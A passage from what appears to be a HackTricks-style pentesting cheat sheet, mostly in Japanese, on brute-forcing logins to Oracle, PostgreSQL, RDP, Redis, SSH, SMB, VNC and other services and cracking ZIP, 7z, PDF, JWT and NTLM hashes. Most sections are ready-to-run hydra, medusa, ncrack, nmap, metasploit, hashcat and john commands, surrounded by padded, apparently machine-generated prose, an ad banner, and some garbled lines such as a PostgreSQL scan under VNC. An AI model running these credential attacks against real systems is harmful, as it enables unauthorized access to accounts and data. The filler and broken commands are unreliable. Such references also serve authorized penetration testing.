[オフラインOracleSQLハッシュブルートフォース](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**、および**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
Brute force is a common method used in hacking to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. This method is often used when there is no other known vulnerability or weakness in the system's security.

Brute force attacks can be time-consuming and resource-intensive, especially if the password being targeted is long and complex. However, with the help of powerful computers and specialized software, hackers can automate the process and significantly speed up the attack.

To protect against brute force attacks, it is important to use strong and unique passwords that are not easily guessable. Additionally, implementing account lockout policies, which temporarily lock an account after a certain number of failed login attempts, can also help mitigate the risk of brute force attacks.

It is worth noting that brute force attacks are illegal and unethical. Engaging in such activities without proper authorization is a violation of the law and can result in severe consequences.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQLはオープンソースのリレーショナルデータベース管理システムです。ブルートフォース攻撃は、PostgreSQLデータベースに対して非常に効果的な攻撃手法の1つです。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために、すべての可能な組み合わせを試行する方法です。

ブルートフォース攻撃は、通常、辞書攻撃と組み合わせて使用されます。辞書攻撃では、一般的なパスワードや単語のリストを使用して、攻撃対象のデータベースに対して試行します。ブルートフォース攻撃は、辞書攻撃が成功しなかった場合に使用され、すべての可能な組み合わせを試すことで、パスワードを特定します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、十分な計算リソースと時間があれば、成功する可能性があります。攻撃者は、高速なハードウェアやクラウドプロバイダーのリソースを利用して、ブルートフォース攻撃を実行することができます。

PostgreSQLデータベースをブルートフォース攻撃から保護するためには、強力なパスワードポリシーを実装し、パスワードの長さと複雑さを確保する必要があります。また、アカウントロックアウト機能やIP制限などのセキュリティメカニズムを使用することも重要です。さらに、最新のセキュリティパッチを適用し、PostgreSQLデータベースを常に最新の状態に保つことも重要です。

ブルートフォース攻撃は、PostgreSQLデータベースのセキュリティを脅かす可能性があるため、適切な対策を講じることが重要です。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)から`.deb`パッケージをダウンロードしてインストールすることができます。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
## RDP

RDP (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft that allows users to remotely access and control a computer over a network. It is commonly used for remote administration and remote support purposes.

### Brute Force Attack on RDP

A brute force attack on RDP involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This is done by using automated tools that can rapidly attempt multiple login attempts.

#### Tools for Brute Force Attack on RDP

There are several tools available for conducting brute force attacks on RDP. Some popular ones include:

- Hydra: A powerful command-line tool that supports multiple protocols, including RDP.
- Crowbar: A brute forcing tool specifically designed for RDP.
- TSGrinder: A Windows-based tool that can perform brute force attacks on RDP.

#### Mitigating Brute Force Attacks on RDP

To protect against brute force attacks on RDP, it is recommended to implement the following security measures:

- Use strong and complex passwords that are difficult to guess.
- Enable account lockout policies to temporarily lock out users after a certain number of failed login attempts.
- Implement network-level authentication (NLA) to require users to authenticate before establishing an RDP session.
- Limit the number of RDP login attempts per minute to prevent automated brute force attacks.
- Monitor RDP logs for any suspicious activity and take appropriate action if an attack is detected.

By following these best practices, you can significantly reduce the risk of a successful brute force attack on RDP.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Redis

Redis（Remote Dictionary Server）は、高速でオープンソースのキーバリューストアです。Redisは、メモリ内でデータを保持するため、高速な読み書きアクセスが可能です。また、データの永続化もサポートしています。

## ブルートフォース攻撃

ブルートフォース攻撃は、暗号化されたデータやパスワードを解読するために使用される攻撃手法です。この攻撃手法では、すべての可能な組み合わせを試行し、正しい組み合わせを見つけるまで続けます。

Redisに対するブルートフォース攻撃では、一連のパスワードを試行し、正しいパスワードを見つけることを目指します。攻撃者は、一般的なパスワードや辞書攻撃を使用して、パスワードを推測します。

ブルートフォース攻撃は、強力なパスワードポリシーが実装されていない場合や、弱いパスワードが使用されている場合に特に効果的です。攻撃者は、パスワードの推測に時間がかかる場合でも、自動化されたツールを使用して攻撃を行うことができます。

## ブルートフォース攻撃の防止策

ブルートフォース攻撃からRedisを保護するためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実装する：長いパスワード、大文字と小文字の組み合わせ、数字や特殊文字の使用など、セキュリティを強化するための要件を設定します。
- パスワードの定期的な変更：定期的にパスワードを変更することで、攻撃者の攻撃を困難にします。
- ログイン試行回数の制限：ログイン試行回数を制限することで、ブルートフォース攻撃を防止します。
- IPアドレスの制限：特定のIPアドレスからのアクセスを制限することで、不正なアクセスを防止します。
- 2要素認証の使用：2要素認証を使用することで、追加のセキュリティレイヤーを提供します。

これらの対策を組み合わせることで、Redisへのブルートフォース攻撃を防止することができます。
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec is a remote execution service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple servers or performing system maintenance tasks.

One common method of brute-forcing Rexec is by attempting to guess the username and password combination. This can be done by using a list of commonly used usernames and passwords, or by using a dictionary attack where a list of words is used as potential passwords.

Another method is to use a brute-force tool that automatically generates and tries different combinations of usernames and passwords. These tools can be configured to use different variations of usernames and passwords, such as adding numbers or special characters.

It is important to note that brute-forcing Rexec is a time-consuming process and may not always be successful. Additionally, it is considered unethical and illegal to attempt to brute-force a system without proper authorization.

To protect against brute-force attacks, it is recommended to use strong and unique passwords, implement account lockout policies, and monitor for suspicious login attempts.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems. 

Brute forcing Rlogin involves systematically trying different username and password combinations until a successful login is achieved. This can be done using automated tools or scripts that iterate through a list of common usernames and passwords.

It is important to note that brute forcing Rlogin is considered an unethical and illegal activity unless you have explicit permission from the system owner to perform such actions. Unauthorized brute forcing can lead to account lockouts, system instability, and potential legal consequences.

If you are a system administrator or security professional, it is recommended to implement strong authentication mechanisms and monitor for any suspicious login attempts to protect against brute force attacks.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. However, it is important to note that Rsh is considered insecure due to its lack of encryption and authentication mechanisms.

One common brute-force attack method against Rsh is to systematically try different username and password combinations until a successful login is achieved. This can be done using automated tools such as Hydra or Medusa.

To protect against brute-force attacks on Rsh, it is recommended to disable or restrict access to the Rsh service. Additionally, implementing strong authentication mechanisms, such as using SSH (Secure Shell) instead of Rsh, can greatly enhance the security of remote administration tasks.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsyncは、ファイル転送と同期のための強力なツールです。このツールは、ローカルマシンとリモートマシン間でファイルを転送するために使用されます。Rsyncは、ファイルの差分を計算し、変更された部分のみを転送することができます。これにより、転送時間と帯域幅を節約することができます。

Rsyncは、SSHプロトコルを使用してファイルを転送するため、セキュリティが確保されています。また、転送中に途中でエラーが発生した場合でも、再開することができます。

Rsyncは、以下のようなコマンドで使用することができます。

```
rsync [オプション] <ソース> <宛先>
```

オプションには、転送の方法や動作を指定するためのさまざまなフラグがあります。詳細な情報は、Rsyncのドキュメントを参照してください。

Rsyncは、ファイルのバックアップや同期、リモートサーバーへのファイルのアップロードなど、さまざまなシナリオで使用されます。
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real Time Streaming Protocol）は、ストリーミングメディアを配信するためのプロトコルです。RTSPは、クライアントとサーバー間でメディアの制御情報をやり取りするために使用されます。このプロトコルは、リアルタイムのビデオやオーディオのストリームを効率的に転送するために設計されています。

RTSPの攻撃手法の一つに、ブルートフォース攻撃があります。ブルートフォース攻撃は、辞書やパスワードのリストを使用して、正しい認証情報を推測することを試みます。攻撃者は、ユーザー名とパスワードの組み合わせを総当たりで試し、正しい組み合わせを見つけることを目指します。

ブルートフォース攻撃は、RTSPサーバーに対して行われる場合、サーバーのセキュリティを脆弱にする可能性があります。攻撃者が正しい認証情報を見つけると、サーバーにアクセスし、ストリーミングメディアを不正に取得することができます。

RTSPサーバーのセキュリティを強化するためには、強力なパスワードポリシーを実装し、ブルートフォース攻撃を防ぐためにアカウントロックアウト機能を使用することが重要です。また、セキュリティパッチやアップデートを定期的に適用することも推奨されます。

ブルートフォース攻撃は、RTSPサーバーの脆弱性を悪用するため、セキュリティの専門知識を持つ攻撃者によって行われる可能性があります。したがって、セキュリティ意識を高め、適切な対策を講じることが重要です。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの管理と監視に使用されるプロトコルです。SNMPは、ネットワーク上のデバイスの情報を収集し、設定を変更するために使用されます。SNMPは、エージェントとマネージャの間で通信を行い、エージェントはデバイスの情報を提供し、マネージャはそれを収集して処理します。

SNMPは、デバイスの状態やパフォーマンスに関する情報を取得するために使用されます。これには、CPU使用率、メモリ使用量、ネットワークトラフィックなどが含まれます。また、SNMPを使用してデバイスの設定を変更することもできます。たとえば、ルーターのルーティングテーブルを変更することができます。

SNMPは、コミュニティストリングと呼ばれるパスワードを使用して認証を行います。コミュニティストリングは、エージェントとマネージャの間で共有されるため、セキュリティ上のリスクがあります。したがって、適切なセキュリティ対策を講じることが重要です。

SNMPは、ネットワークデバイスの管理と監視において非常に便利なツールですが、悪意のあるハッカーに悪用される可能性もあります。したがって、SNMPを使用する場合は、セキュリティの観点から注意が必要です。
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）は、ネットワーク上でファイル共有やリソース共有を行うためのプロトコルです。SMBは、Windowsオペレーティングシステムで広く使用されており、ファイルやプリンターの共有、リモートファイルアクセス、ネットワーク上のファイルの転送などに使用されます。

SMBのブルートフォース攻撃は、辞書攻撃の一種であり、ユーザー名とパスワードの組み合わせを総当たりで試行し、正しい認証情報を見つけることを目指します。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃は、ネットワーク上のSMBサーバーに対して自動化されたツールを使用して行われることがあります。これにより、大量のユーザー名とパスワードの組み合わせを高速で試行することができます。

SMBのブルートフォース攻撃は、セキュリティ上の脆弱性を悪用するため、適切なセキュリティ対策が必要です。これには、強力なパスワードポリシーの実施、アカウントロックアウトの設定、二要素認証の導入などが含まれます。

ブルートフォース攻撃は、合法的なセキュリティテストやペネトレーションテストの一環として使用されることもありますが、許可なく他人のシステムに対して行うことは違法です。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
SMTP（Simple Mail Transfer Protocol）は、電子メールの送信に使用されるプロトコルです。SMTPサーバーに接続し、メールを送信するために使用されます。SMTPは、メールアドレスの確認やメールの送信制限などのセキュリティ機能を提供します。SMTPサーバーへのアクセスを不正に取得することで、攻撃者はスパムメールの送信やフィッシング詐欺の実行など、悪意のある活動を行うことができます。

SMTPサーバーへの不正アクセスを試みる際に使用される一般的な手法の1つは、ブルートフォース攻撃です。ブルートフォース攻撃では、攻撃者は可能なすべてのパスワードの組み合わせを試し、正しいパスワードを見つけることを目指します。これにより、攻撃者はSMTPサーバーにログインし、不正なメールの送信を行うことができます。

ブルートフォース攻撃を実行するためには、パスワードリストと呼ばれるテキストファイルが必要です。このファイルには、一般的なパスワードや辞書ワードが含まれています。攻撃者は、このリストを使用してパスワードを試し、正しいパスワードを見つけることを試みます。

ブルートフォース攻撃は非常に時間がかかる場合があります。これは、パスワードの組み合わせが非常に多いためです。攻撃者は、高速なコンピュータやクラウドベースの計算リソースを使用して攻撃を加速させることができます。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装することが重要です。また、アカウントロックアウト機能やログイン試行回数の制限などのセキュリティメカニズムを使用することも推奨されます。これにより、攻撃者のブルートフォース攻撃を困難にすることができます。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
SOCKSは、ネットワークプロトコルであり、プロキシサーバーを介してTCP/IP接続を確立するために使用されます。 SOCKSプロトコルは、クライアントとサーバーの間でデータを中継するために使用されます。 SOCKSプロキシは、ユーザーのIPアドレスを隠すために使用されることがあります。 SOCKSプロキシを使用すると、ユーザーは自分のIPアドレスを隠すことができ、匿名でインターネットにアクセスすることができます。

SOCKSプロキシをハッキングに使用する場合、ブルートフォース攻撃は一般的な手法です。ブルートフォース攻撃では、ハッカーはすべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを試みます。これにより、ハッカーはシステムに不正アクセスすることができます。

ブルートフォース攻撃を実行するためには、ハッカーは通常、辞書攻撃やランダムなパスワード生成などの手法を使用します。辞書攻撃では、ハッカーは一連の一般的なパスワードを試し、ランダムなパスワード生成では、ハッカーはランダムな文字列の組み合わせを試します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、十分な計算リソースと時間があれば、ハッカーは成功する可能性があります。したがって、セキュリティを強化するためには、強力なパスワードポリシーを実装し、ブルートフォース攻撃を防ぐための対策を講じることが重要です。
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）は、ネットワーク上で安全なリモートアクセスを提供するプロトコルです。SSHを使用すると、暗号化されたトンネルを介してリモートサーバーに接続し、コマンドを実行したりファイルを転送したりすることができます。

SSHのブルートフォース攻撃は、辞書攻撃とも呼ばれ、SSHサーバーへの不正アクセスを試みる手法です。攻撃者は、一連のパスワードを試し、正しいパスワードを見つけることを目指します。

SSHブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する：長さ、複雑さ、一意性の要件を設定し、定期的なパスワード変更を促す。
- ログイン試行回数の制限：一定の時間内に許可されるログイン試行回数を制限する。
- パスワード認証の無効化：公開鍵認証を使用してSSH接続を設定し、パスワード認証を無効にする。
- ファイアウォールの設定：SSHポートへのアクセスを制限するために、ファイアウォールを使用する。

これらの対策を実施することで、SSHブルートフォース攻撃からシステムを保護することができます。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱いSSHキー/Debianの予測可能なPRNG
一部のシステムでは、暗号化素材を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キースペースが劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)などのツールでブルートフォース攻撃が可能になります。また、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)などの弱いキーの事前生成セットも利用可能です。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnetは、ネットワーク上のリモートコンピュータに接続するためのプロトコルです。このプロトコルを使用すると、リモートコンピュータに対してコマンドを送信し、その結果を受け取ることができます。

Telnetは、ユーザー名とパスワードを使用してリモートコンピュータにログインするために使用されることがあります。しかし、Telnetはセキュリティ上の脆弱性があるため、暗号化されたSSHプロトコルに置き換えられることが一般的です。

ハッカーは、Telnetを使用してブルートフォース攻撃を行うことがあります。ブルートフォース攻撃では、ハッカーはさまざまなユーザー名とパスワードの組み合わせを試し、正しい組み合わせを見つけることを試みます。これにより、ハッカーは不正アクセスを試みることができます。

ハッカーは、ブルートフォース攻撃を行うために、自動化ツールや辞書攻撃を使用することがあります。自動化ツールは、大量のユーザー名とパスワードの組み合わせを高速で試すことができます。辞書攻撃では、事前に作成されたパスワードリストを使用して攻撃を行います。

ブルートフォース攻撃は、強力なパスワードポリシーが実装されていない場合や、デフォルトのユーザー名とパスワードが使用されている場合に特に効果的です。ハッカーは、ユーザーが簡単なパスワードを使用していることを予測し、それを利用して不正アクセスを試みることができます。

ネットワークのセキュリティを強化するためには、Telnetの使用を制限し、代わりにSSHなどのより安全なプロトコルを使用することが重要です。また、強力なパスワードポリシーを実装し、定期的なパスワード変更を促すことも重要です。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）は、リモートデスクトッププロトコル（RDP）の一種であり、リモートマシンへのアクセスを提供するために使用されます。VNCは、クライアントとサーバーの間でデスクトップ画面の情報を送受信することによって動作します。

VNCのブルートフォース攻撃は、パスワードの推測を行い、正しいパスワードを見つけることを目指します。ブルートフォース攻撃は、一連のパスワードを試し、正しいパスワードが見つかるまで続けられます。

以下は、VNCのブルートフォース攻撃の手順です。

1. ブルートフォース攻撃ツールを使用して、VNCサーバーに接続します。
2. ユーザー名のリストとパスワードのリストを作成します。
3. ブルートフォース攻撃ツールを使用して、ユーザー名とパスワードの組み合わせを試します。
4. 正しいユーザー名とパスワードの組み合わせが見つかるまで、繰り返し試行します。

ブルートフォース攻撃は、パスワードが強力である場合や、アカウントがロックアウトされるまで続けられる可能性があるため、時間がかかる場合があります。また、ブルートフォース攻撃は、合法的な目的でのみ使用されるべきです。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrmは、Windowsリモート管理（WinRM）プロトコルを使用して、リモートでWindowsマシンを管理するためのサービスです。WinRMは、ネットワーク上のWindowsマシンと通信するための安全なリモート接続を提供します。

Winrmを使用して、ユーザーはリモートマシンに対してコマンドを実行したり、設定を変更したりすることができます。Winrmは、PowerShellスクリプトをリモートで実行するための便利なツールです。

Winrmは、デフォルトでは有効になっていない場合があります。有効にするには、管理者権限でコマンドプロンプトを開き、次のコマンドを実行します。

```
winrm quickconfig
```

Winrmは、デフォルトでHTTPポート5985を使用しますが、セキュリティを強化するためにHTTPSポート5986を使用することもできます。HTTPSを使用する場合は、証明書のインストールと構成が必要です。

Winrmは、ユーザー名とパスワードを使用して認証を行います。また、Winrmは、Windowsファイアウォールの例外として設定する必要があります。

Winrmは、ネットワーク上のWindowsマシンを管理するための強力なツールですが、悪意のあるユーザーによって悪用される可能性もあります。したがって、Winrmを使用する際には、適切なセキュリティ対策を講じることが重要です。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化することができます。\
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ローカル

### オンラインクラッキングデータベース

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (ハッシュ、WPA2キャプチャ、およびMSOffice、ZIP、PDFのアーカイブ...)
* [https://crackstation.net/](https://crackstation.net) (ハッシュ)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (ハッシュおよびファイルハッシュ)
* [https://hashes.org/search.php](https://hashes.org/search.php) (ハッシュ)
* [https://www.cmd5.org/](https://www.cmd5.org) (ハッシュ)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

ハッシュをブルートフォースする前に、これをチェックしてください。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 既知の平文zip攻撃

暗号化されたzip内のファイルの**平文**（または平文の一部）を知る必要があります。暗号化されたzip内のファイルの**ファイル名とサイズを確認**するには、**`7z l encrypted.zip`**を実行します。\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7zは、高い圧縮率を持つオープンソースのファイルアーカイバです。7zファイルは、他のファイルアーカイブ形式よりも小さくなる傾向があります。この形式は、7-Zipソフトウェアによって作成および解凍することができます。

7zファイルのパスワードを解読するために、ブルートフォース攻撃を使用することができます。ブルートフォース攻撃は、すべての可能なパスワードの組み合わせを試すことで、正しいパスワードを見つける手法です。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、パスワードが弱い場合や短い場合には効果的です。ただし、強力なパスワードを使用している場合や、パスワードがランダムな場合には、ブルートフォース攻撃は非現実的な方法となる可能性があります。

7zファイルのブルートフォース攻撃を実行するためには、専用のツールやスクリプトを使用することができます。これらのツールは、自動的にパスワードの組み合わせを生成し、7zファイルに対して試行します。ただし、ブルートフォース攻撃は合法的な目的でのみ使用することが重要です。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
## ブルートフォース攻撃

ブルートフォース攻撃は、パスワードや暗号鍵を推測するために、すべての可能な組み合わせを試す攻撃手法です。この攻撃は、パスワードの弱さや予測可能性をテストするために使用されます。

### ブルートフォース攻撃の手法

1. 辞書攻撃：事前に作成された辞書ファイルを使用して、一連の単語やフレーズを試す方法です。この攻撃は、一般的なパスワードや一般的なフレーズに対して効果的です。

2. 総当たり攻撃：すべての可能な組み合わせを順番に試す方法です。この攻撃は、パスワードの長さや文字セットが限られている場合に有効です。

3. ハイブリッド攻撃：辞書攻撃と総当たり攻撃を組み合わせた攻撃手法です。まず辞書攻撃を試し、成功しない場合に総当たり攻撃に移行します。

### ブルートフォース攻撃のツール

1. Hydra：多くのプロトコル（SSH、FTP、Telnetなど）に対してブルートフォース攻撃を実行するためのツールです。

2. Medusa：SSH、Telnet、FTP、HTTPなどのプロトコルに対してブルートフォース攻撃を実行するための高速なツールです。

3. John the Ripper：パスワードクラッキングツールであり、辞書攻撃や総当たり攻撃などのブルートフォース攻撃手法をサポートしています。

### ブルートフォース攻撃の対策

1. 強力なパスワードポリシーの実施：長さ、複雑さ、一意性などの要件を満たすパスワードポリシーを作成し、適用します。

2. 二要素認証の使用：パスワードに加えて、追加の認証要素（SMSコード、ワンタイムパスワードなど）を要求します。

3. ロックアウトポリシーの設定：一定回数の認証失敗後にアカウントをロックするポリシーを設定します。

4. ログ監視とアラート：異常なアクティビティを監視し、ブルートフォース攻撃の試行を検出するためのログ監視とアラートシステムを実装します。

5. CAPTCHAの使用：自動化されたブルートフォース攻撃を防ぐために、CAPTCHAを使用します。

### まとめ

ブルートフォース攻撃は、パスワードや暗号鍵を推測するために使用される攻撃手法です。辞書攻撃、総当たり攻撃、ハイブリッド攻撃などの手法があります。強力なパスワードポリシーの実施、二要素認証の使用、ロックアウトポリシーの設定、ログ監視とアラート、CAPTCHAの使用などの対策を実施することで、ブルートフォース攻撃からの保護を強化することができます。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDFオーナーパスワード

PDFオーナーパスワードをクラックするには、次を確認してください：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM クラッキング

NTLM クラッキングは、Windows ベースのシステムで使用される認証プロトコルである NTLM のパスワードを解読する手法です。NTLM ハッシュを取得するために、パスワードの推測や辞書攻撃、ブルートフォース攻撃などの手法が使用されます。

NTLM ハッシュは、Windows システムでパスワードを保護するために使用されるものであり、ユーザーのパスワードを平文ではなくハッシュ値として保存します。NTLM クラッキングでは、ハッシュ値を解読することで、元のパスワードを特定しようとします。

NTLM クラッキングには、さまざまなツールやリソースが利用されます。一般的なツールには、John the Ripper、Hashcat、Cain & Abel などがあります。これらのツールは、高速なハッシュクラッキングを実行するための機能を提供します。

NTLM クラッキングは、セキュリティ評価やペネトレーションテストにおいて、パスワードの弱さを特定するために使用されます。しかし、合法的な目的以外での使用は違法ですので、適切な許可を得て行う必要があります。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

